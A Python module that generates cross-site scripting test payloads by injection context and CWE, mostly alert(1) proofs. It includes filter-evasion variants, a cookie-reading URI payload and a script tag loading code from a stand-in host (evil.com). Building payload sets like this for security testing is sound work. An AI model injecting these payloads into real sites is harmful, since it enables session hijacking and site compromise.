"""
XSS payload generators for Cross-Site Scripting testing.

Payloads organized by injection context:
- HTML body
- HTML attributes
- JavaScript strings
- URI schemes (href, src)
- Filter bypass techniques
- DOM-based XSS

CWE Coverage: CWE-79, CWE-80, CWE-81, CWE-83, CWE-84, CWE-85, CWE-86, CWE-87
"""

from typing import Generator


def html_body_payloads() -> Generator[str, None, None]:
    """
    Payloads for HTML body context.
    CWE-79, CWE-80: Basic XSS in HTML content.
    """
    payloads = [
        # Basic script tags
        "<script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script src=//evil.com/xss.js></script>",
        # Event handlers - img
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(1)//>",
        '<img src="x" onerror="alert(1)">',
        # Event handlers - svg
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(1)//",
        # Event handlers - other tags
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        # Math and foreign elements
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<xss onmouseover=alert(1)>hover</xss>",
    ]
    yield from payloads


def attribute_payloads(quote_char: str = '"') -> Generator[str, None, None]:
    """
    Payloads for HTML attribute context breakout.
    CWE-83: XSS in Attributes.

    Args:
        quote_char: Quote character used in attributes ('"' or "'")
    """
    if quote_char == '"':
        payloads = [
            '" onmouseover="alert(1)',
            '" onfocus="alert(1)" autofocus="',
            '" onclick="alert(1)',
            '" onload="alert(1)',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '" autofocus onfocus="alert(1)" x="',
            '"/><script>alert(1)</script>',
        ]
    else:
        payloads = [
            "' onmouseover='alert(1)",
            "' onfocus='alert(1)' autofocus='",
            "' onclick='alert(1)",
            "'><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "' autofocus onfocus='alert(1)' x='",
        ]
    yield from payloads


def javascript_payloads(quote_char: str = "'") -> Generator[str, None, None]:
    """
    Payloads for JavaScript string context.
    CWE-79: XSS via JavaScript injection.

    Args:
        quote_char: Quote character used in JS string ("'" or '"')
    """
    if quote_char == "'":
        payloads = [
            "';alert(1)//",
            "';alert(1);'",
            "'-alert(1)-'",
            "\\';alert(1)//",
            "</script><script>alert(1)</script>",
            "'+alert(1)+'",
            "';alert(String.fromCharCode(88,83,83))//",
        ]
    else:
        payloads = [
            '";alert(1)//',
            '";alert(1);"',
            '"-alert(1)-"',
            '\";alert(1)//',
            "</script><script>alert(1)</script>",
            '"+alert(1)+"',
        ]
    # Template literal payloads
    template_payloads = [
        "${alert(1)}",
        "`${alert(1)}`",
        "${constructor.constructor('alert(1)')()}",
    ]
    yield from payloads
    yield from template_payloads


def uri_scheme_payloads() -> Generator[str, None, None]:
    """
    Payloads for URI context (href, src, action attributes).
    CWE-84: XSS via URI Schemes.
    """
    payloads = [
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript:alert(document.cookie)",
        "javascript:alert`1`",
        "javascript:alert(/XSS/)",
        "JaVaScRiPt:alert(1)",
        "  javascript:alert(1)",
        "javascript://comment%0aalert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:text/html,<img src=x onerror=alert(1)>",
        "vbscript:alert(1)",  # Legacy IE
    ]
    yield from payloads


def filter_bypass_payloads() -> Generator[str, None, None]:
    """
    Payloads designed to bypass common XSS filters.
    CWE-85: Doubled Character XSS
    CWE-86: Invalid Character XSS
    CWE-87: Alternate XSS Syntax
    """
    payloads = [
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<ScRiPt>alert(1)</sCrIpT>",
        # Doubled/nested tags
        "<scr<script>ipt>alert(1)</script>",
        "<<script>script>alert(1)<</script>/script>",
        # Whitespace variations
        "<svg/onload=alert(1)>",
        "<svg\tonload=alert(1)>",
        "<svg\nonload=alert(1)>",
        "<svg\r\nonload=alert(1)>",
        "<img\tsrc=x\tonerror=alert(1)>",
        # Null bytes and special chars
        "<scr%00ipt>alert(1)</script>",
        "<img src=x onerror=\x00alert(1)>",
        # HTML encoding in event handlers
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
        # No quotes
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        # Unicode escapes
        "<img src=x onerror=\\u0061lert(1)>",
        # Expression without parentheses
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert`1`>",
        # Constructor tricks
        "<img src=x onerror=constructor.constructor('alert(1)')()>",
        # Protocol obfuscation
        "<a href='&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)'>x</a>",
    ]
    yield from payloads


def dom_based_payloads() -> Generator[str, None, None]:
    """
    Payloads for DOM-based XSS testing.
    CWE-79: DOM-based XSS via client-side sinks.
    """
    payloads = [
        # URL fragment payloads
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
        "#<svg onload=alert(1)>",
        "#javascript:alert(1)",
        # URL parameter payloads
        "?default=<script>alert(1)</script>",
        "?q=<img src=x onerror=alert(1)>",
        "?callback=alert(1)",
        "?redirect=javascript:alert(1)",
        # Common DOM source payloads
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "'-alert(1)-'",
        '"-alert(1)-"',
    ]
    yield from payloads


def error_page_payloads() -> Generator[str, None, None]:
    """
    Payloads for XSS in error pages.
    CWE-81: XSS in Error Messages.
    """
    payloads = [
        # 404 page payloads
        "/<script>alert(1)</script>",
        "/<img src=x onerror=alert(1)>",
        "/nonexistent<script>alert(1)</script>",
        # Error parameter payloads
        "?error=<script>alert(1)</script>",
        "?msg=<img src=x onerror=alert(1)>",
        "?debug=<svg onload=alert(1)>",
    ]
    yield from payloads


def get_all_payloads() -> Generator[str, None, None]:
    """Yield all XSS payloads across all contexts."""
    yield from html_body_payloads()
    yield from attribute_payloads('"')
    yield from attribute_payloads("'")
    yield from javascript_payloads("'")
    yield from javascript_payloads('"')
    yield from uri_scheme_payloads()
    yield from filter_bypass_payloads()
    yield from dom_based_payloads()
    yield from error_page_payloads()


def get_payloads_by_cwe(cwe: str) -> Generator[str, None, None]:
    """
    Get payloads targeting a specific CWE.

    Args:
        cwe: CWE identifier (e.g., "CWE-79", "CWE-83")
    """
    cwe_map = {
        "CWE-79": list(html_body_payloads()) + list(dom_based_payloads()),
        "CWE-80": list(html_body_payloads()),
        "CWE-81": list(error_page_payloads()),
        "CWE-83": list(attribute_payloads('"')) + list(attribute_payloads("'")),
        "CWE-84": list(uri_scheme_payloads()),
        "CWE-85": [p for p in filter_bypass_payloads() if "<<" in p or "><" in p],
        "CWE-86": [p for p in filter_bypass_payloads() if "%00" in p or "\\x" in p],
        "CWE-87": list(filter_bypass_payloads()),
    }
    yield from cwe_map.get(cwe.upper(), [])


if __name__ == "__main__":
    print("=== XSS Payloads by Context ===\n")

    print("HTML Body Payloads:")
    for i, p in enumerate(html_body_payloads(), 1):
        print(f"  {i}. {p}")

    print("\nAttribute Payloads (double quote):")
    for i, p in enumerate(attribute_payloads('"'), 1):
        print(f"  {i}. {p}")

    print("\nURI Scheme Payloads:")
    for i, p in enumerate(uri_scheme_payloads(), 1):
        print(f"  {i}. {p}")

    print("\nFilter Bypass Payloads:")
    for i, p in enumerate(filter_bypass_payloads(), 1):
        print(f"  {i}. {p}")
